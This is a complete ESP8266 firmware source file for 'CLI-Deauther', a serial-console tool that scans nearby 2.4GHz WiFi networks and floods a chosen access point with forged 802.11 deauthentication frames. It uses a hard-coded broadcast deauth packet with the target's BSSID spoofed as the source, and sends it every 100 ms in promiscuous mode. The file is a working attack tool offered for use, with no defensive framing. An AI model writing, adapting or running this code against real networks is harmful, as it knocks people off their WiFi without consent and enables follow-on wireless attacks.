/*
 * CLI-Deauther
 * A tool that deauthenticates 2.4GHz WiFi networks over a serial console.
 * Author - WireBits 
 */

#include <ESP8266WiFi.h>

struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
};

WiFiNetwork scannedNetworks[50];
int networkCount = 0;
bool scanning = false;
bool deauthRunning = false;
uint8_t targetBSSID[6];
int targetChannel = 1;

const uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    delay(1000);
}

void loop() {
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();
        if (command.equalsIgnoreCase("scan")) {
            startWiFiScan();
        }
        else if (command.equalsIgnoreCase("stopscan")) {
            Serial.println("[*] Scanning stopped!");
            scanning = false;
        }
        else if (command.startsWith("deauth ")) {
            int index = command.substring(7).toInt();
            startDeauth(index);
        }
        else if (command.equalsIgnoreCase("stopdeauth")) {
            stopDeauth();
        }
        else if (command.equalsIgnoreCase("help")) {
            showHelp();
        }
        else {
            Serial.println("[!] Invalid command. Type 'help' for available commands.");
        }
    }
    if (scanning) {
        int found = WiFi.scanComplete();
        if (found >= 0) {
            showScannedNetworks();
            scanning = false;
        }
    }
    if (deauthRunning) {
        sendDeauth();
    }
}

void startWiFiScan() {
    Serial.println("[*] Scanning for networks...");
    scanning = true;
    WiFi.scanNetworks(true);
}

void showScannedNetworks() {
    networkCount = WiFi.scanComplete();
    if (networkCount == 0) {
        Serial.println("[!] No networks found!");
        return;
    }

    Serial.println("\n[*] Scanned WiFi Networks:");
    for (int i = 0; i < networkCount; i++) {
        scannedNetworks[i].ssid = WiFi.SSID(i);
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        Serial.printf("\n[%d]------------------\n", i);
        Serial.printf("SSID   : %s\n", scannedNetworks[i].ssid.c_str());
        Serial.printf("BSSID  : %02X:%02X:%02X:%02X:%02X:%02X\n",
                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
                      scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
        Serial.printf("Channel: %d\n", scannedNetworks[i].channel);
        Serial.printf("RSSI   : %d dBm\n", scannedNetworks[i].rssi);
        Serial.println("----------------------");
    }
}

void startDeauth(int index) {
    if (index < 0 || index >= networkCount) {
        Serial.println("[!] Invalid index!");
        return;
    }
    memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
    targetChannel = scannedNetworks[index].channel;
    Serial.printf("[*] Deauth Attack Started on %s (Channel: %d)\n", scannedNetworks[index].ssid.c_str(), targetChannel);
    WiFi.disconnect();
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChannel);
    deauthRunning = true;
}

void stopDeauth() {
    deauthRunning = false;
    wifi_promiscuous_enable(0);
    WiFi.mode(WIFI_STA);
    Serial.println("[*] Deauth Attack Stopped!");
}

void sendDeauth() {
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);
    memcpy(&packet[10], targetBSSID, 6);
    memcpy(&packet[16], targetBSSID, 6);
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(100);
}

void showHelp() {
    Serial.println("\nAvailable Commands:");
    Serial.println("  scan           - Scan for nearby WiFi networks");
    Serial.println("  stopscan       - Stop scanning");
    Serial.println("  deauth X       - Start deauth attack on network X (X = Index Number)");
    Serial.println("  stopdeauth     - Stop deauth attack");
    Serial.println("  help           - Show this help message\n");
}
